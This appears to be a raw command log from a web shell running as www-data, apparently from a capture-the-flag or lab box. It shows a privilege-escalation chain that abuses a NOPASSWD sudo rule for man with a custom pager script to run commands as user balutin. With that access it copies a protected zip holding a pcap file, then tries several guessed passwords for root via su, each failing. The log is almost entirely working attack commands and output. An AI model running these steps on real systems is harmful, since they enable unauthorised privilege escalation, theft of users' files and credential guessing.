@@ -1,0 +1,95 @@
+######## CMD: printf "#!/bin/sh\n/bin/sh /tmp/cmd.txt > /tmp/bal.out 2>&1\n" > /tmp/run.sh; chmod 755 /tmp/run.sh; printf "id\nwhoami\nls -la /home/balutin/\n" > /tmp/cmd.txt; chmod 644 /tmp/cmd.txt; rm -f /tmp/bal.out; script -qec "sudo -u balutin /usr/bin/man -P /tmp/run.sh ls" /dev/null >/dev/null 2>&1; echo "rc=$?"; echo "=== bal.out ==="; cat /tmp/bal.out
+<pre></pre><pre>www-data
+rc=0
+=== bal.out ===
+uid=1000(balutin) gid=1000(balutin) groups=1000(balutin),100(users)
+balutin
+total 24
+drwx------ 2 balutin balutin 4096 Apr  5  2025 .
+drwxr-xr-x 1 root    root    4096 Apr  5  2025 ..
+-rw-r--r-- 1 balutin balutin  220 Apr  5  2025 .bash_logout
+-rw-r--r-- 1 balutin balutin 3526 Apr  5  2025 .bashrc
+-rw-r--r-- 1 balutin balutin  807 Apr  5  2025 .profile
+-rw-r--r-- 1 balutin balutin  483 Apr  5  2025 secretito.zip
+</pre>
+   [http requests used: 2]
+######## CMD: sudo -n -l 2>&1; echo "--- copy zip to /tmp ---"; cp /home/balutin/secretito.zip /tmp/s.zip; chmod 644 /tmp/s.zip; ls -la /tmp/s.zip; echo "--- unzip test ---"; unzip -l /tmp/s.zip 2>&1; echo "--- unzip attempt no pw ---"; unzip -o -d /tmp/sout /tmp/s.zip 2>&1; echo "rc=$?"
+<pre></pre><pre>www-data
+Matching Defaults entries for www-data on 0f38876b0aa7:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User www-data may run the following commands on 0f38876b0aa7:
+    (balutin) NOPASSWD: /usr/bin/man
+--- copy zip to /tmp ---
+cp: cannot stat '/home/balutin/secretito.zip': Permission denied
+chmod: cannot access '/tmp/s.zip': No such file or directory
+ls: cannot access '/tmp/s.zip': No such file or directory
+--- unzip test ---
+unzip:  cannot find or open /tmp/s.zip, /tmp/s.zip.zip or /tmp/s.zip.ZIP.
+--- unzip attempt no pw ---
+unzip:  cannot find or open /tmp/s.zip, /tmp/s.zip.zip or /tmp/s.zip.ZIP.
+rc=9
+</pre>
+   [http requests used: 2]
+######## CMD: printf "echo EUID=\$(id -u) USER=\$(whoami)\nsudo -n -l 2>&1 | head -3\nls -la /home/balutin/secretito.zip 2>&1\ncp /home/balutin/secretito.zip /tmp/s.zip 2>&1 && chmod 644 /tmp/s.zip && echo COPY_OK\nls -la /tmp/s.zip 2>&1\n" > /tmp/cmd.txt; chmod 644 /tmp/cmd.txt; rm -f /tmp/bal.out /tmp/s.zip; script -qec "sudo -u balutin /usr/bin/man -P /tmp/run.sh ls" /dev/null >/dev/null 2>&1; echo "rc=$?"; echo "=== bal.out ==="; cat /tmp/bal.out
+<pre></pre><pre>www-data
+rm: cannot remove '/tmp/bal.out': Operation not permitted
+rc=0
+=== bal.out ===
+EUID=1000 USER=balutin
+sudo: a password is required
+-rw-r--r-- 1 balutin balutin 483 Apr  5  2025 /home/balutin/secretito.zip
+COPY_OK
+-rw-r--r-- 1 balutin balutin 483 Oct  1 16:34 /tmp/s.zip
+</pre>
+   [http requests used: 2]
+######## CMD: printf "echo EUID=\$(id -u) USER=\$(whoami)\nsudo -n -l 2>&1 | head -2\n" > /tmp/cmd.txt; chmod 644 /tmp/cmd.txt; sudo -u balutin /usr/bin/man -P /tmp/run.sh ls >/dev/null 2>&1 <<< "" ; rm -f /tmp/bal2.out; printf "#!/bin/sh\n/bin/sh /tmp/cmd.txt > /tmp/bal2.out 2>&1\n" > /tmp/run2.sh; chmod 755 /tmp/run2.sh; script -qec "sudo -u balutin /usr/bin/man -P /tmp/run2.sh ls" /dev/null >/dev/null 2>&1; echo "run2 rc=$?"; echo "=== bal2.out (fresh path, no stale risk) ==="; cat /tmp/bal2.out 2>&1
+<pre></pre><pre>www-data
+sh: 1: Syntax error: redirection unexpected
+</pre>
+   [http requests used: 2]
+######## CMD: printf "echo EUID=\$(id -u) USER=\$(whoami)\nsudo -n -l 2>&1 | head -2\nunzip -l /tmp/s.zip\n" > /tmp/cmd.txt; chmod 644 /tmp/cmd.txt; rm -f /tmp/bal3.out; printf "#!/bin/sh\n/bin/sh /tmp/cmd.txt > /tmp/bal3.out 2>&1\n" > /tmp/run3.sh; chmod 755 /tmp/run3.sh; script -qec "sudo -u balutin /usr/bin/man -P /tmp/run3.sh ls" /dev/null >/dev/null 2>&1; echo "run3 rc=$?"; echo "=== bal3.out ==="; cat /tmp/bal3.out 2>&1
+<pre></pre><pre>www-data
+run3 rc=0
+=== bal3.out ===
+EUID=1000 USER=balutin
+sudo: a password is required
+Archive:  /tmp/s.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+      375  2025-04-05 11:24   traffic.pcap
+---------                     -------
+      375                     1 file
+</pre>
+   [http requests used: 2]
+######## CMD: cat > /tmp/cmd.txt <<"ZZEOF"
+printf "%s\n" "secretitosecretazo!" | timeout 10 script -qec "su -c id root" /dev/null
+ZZEOF
+chmod 644 /tmp/cmd.txt
+echo "--- cmd.txt content ---"
+cat /tmp/cmd.txt
+<pre></pre><pre>www-data
+sh: 1: %s\n: not found
+script: unrecognized option '--- cmd.txt content ---ncat'
+Try 'script --help' for more information.
+</pre>
+   [http requests used: 4]
+######## CMD: printf "%s\n" "secretitosecretazo!" | timeout 10 script -qec "su -c id root" /dev/null 2>&1 | tail -5
+<pre></pre><pre>www-data
+secretitosecretazo!
+Password: 
+su: Authentication failure
+</pre>
+   [http requests used: 2]
+######## CMD: for pw in "SuperSecret123!" "chocolate"; do echo "--- candidate: $pw ---"; printf "%s\n" "$pw" | timeout 10 script -qec "su -c id root" /dev/null 2>&1 | grep -vE "^Password:" | tail -4; done
+<pre></pre><pre>www-data
+--- candidate: SuperSecret123! ---
+SuperSecret123!
+su: Authentication failure
+--- candidate: chocolate ---
+chocolate
+su: Authentication failure
+</pre>
+   [http requests used: 2]
